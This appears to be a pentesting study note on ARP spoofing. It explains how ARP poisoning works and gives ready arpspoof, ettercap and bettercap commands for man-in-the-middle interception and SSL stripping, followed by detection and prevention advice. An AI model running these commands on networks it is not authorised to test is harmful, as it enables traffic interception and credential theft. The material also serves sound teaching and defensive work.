# ARP Spoofing

## What is ARP?

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network. When a device wants to communicate with an IP on the same subnet, it broadcasts "Who has IP x.x.x.x? Tell me your MAC."

ARP is **stateless and unauthenticated** — devices accept ARP replies without verification, even if they didn't send a request.

---

## How ARP Works (Normal)

```
Host A wants to talk to 192.168.1.1 (Gateway)

1. A broadcasts: "Who has 192.168.1.1?"
2. Gateway replies: "I have 192.168.1.1, my MAC is aa:bb:cc:dd:ee:ff"
3. A caches this in its ARP table: 192.168.1.1 → aa:bb:cc:dd:ee:ff
4. A sends packets to that MAC
```

Check ARP table:
```bash
arp -a
ip neigh show
```

---

## ARP Spoofing / ARP Poisoning

Attacker sends **unsolicited (gratuitous) ARP replies** associating their MAC with a legitimate IP, poisoning victims' ARP caches.

```
Attacker tells Victim: "192.168.1.1 (Gateway) is at MY MAC"
Attacker tells Gateway: "192.168.1.100 (Victim) is at MY MAC"

Result: All traffic flows through the attacker → Man-in-the-Middle (MitM)
```

---

## Attack Flow

```
Normal:     Victim ←→ Gateway
After ARP:  Victim → Attacker → Gateway (attacker reads/modifies all traffic)
```

Attacker needs:
- Be on the same Layer 2 network (same subnet/VLAN)
- Enable IP forwarding to avoid disrupting victim's connectivity

---

## Performing ARP Spoofing

### Enable IP Forwarding (so victim traffic still works)
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# or
sysctl -w net.ipv4.ip_forward=1
```

### Using arpspoof
```bash
# Poison victim's ARP cache (tell victim: gateway IP = attacker MAC)
arpspoof -i eth0 -t <victim_ip> <gateway_ip>

# Poison gateway's ARP cache (tell gateway: victim IP = attacker MAC)
arpspoof -i eth0 -t <gateway_ip> <victim_ip>
# Run both simultaneously (in separate terminals or background)
```

### Using Ettercap
```bash
# Text mode, ARP poisoning, sniff all hosts on subnet
ettercap -T -M arp:remote /victim_ip// /gateway_ip//

# GUI mode
ettercap -G
```

### Using Bettercap
```bash
sudo bettercap -iface eth0

# In bettercap console:
net.probe on
net.recon on
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
```

---

## What You Can Do as MitM

| Attack | Description |
|---|---|
| Passive sniffing | Capture HTTP, FTP, Telnet credentials |
| SSL Stripping | Downgrade HTTPS to HTTP (with sslstrip) |
| DNS Spoofing | Respond to victim's DNS queries with malicious IPs |
| Session Hijacking | Steal cookies from unencrypted traffic |
| Credential Harvesting | Capture cleartext passwords |
| Inject content | Insert malicious scripts into HTTP responses |

---

## SSL Stripping

Forces HTTP instead of HTTPS — captures credentials even from "secure" sites:
```bash
# With bettercap
set https.proxy.sslstrip true
https.proxy on
```

Modern HSTS (HTTP Strict Transport Security) largely defeats this for major sites.

---

## Detection

### On the victim/network
```bash
# Check for duplicate MACs in ARP table (sign of poisoning)
arp -a | sort -k 4 | uniq -D -f 3

# Monitor ARP traffic with Wireshark
# Filter: arp.duplicate-address-detected
```

### Automated tools
- **XArp** — GUI ARP monitoring
- **arpwatch** — daemon that monitors ARP and alerts on changes
- **Wireshark** — filter `arp` and look for duplicate IP-MAC mappings

---

## Prevention

| Method | Description |
|---|---|
| Dynamic ARP Inspection (DAI) | Managed switch validates ARP against DHCP snooping table |
| Static ARP entries | Manually set critical entries (gateway) — doesn't scale |
| 802.1X port authentication | Authenticate devices before network access |
| VPN / TLS everywhere | Even if intercepted, traffic is encrypted |
| Network segmentation | VLANs limit blast radius |
| Arpwatch | Alert on ARP changes |

---

## Scope Note

ARP spoofing only works on the **same Layer 2 segment** (same subnet/VLAN). It doesn't work across routers.

---

## References

- [HackTricks — ARP Spoofing](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
- [Bettercap Docs](https://www.bettercap.org/)
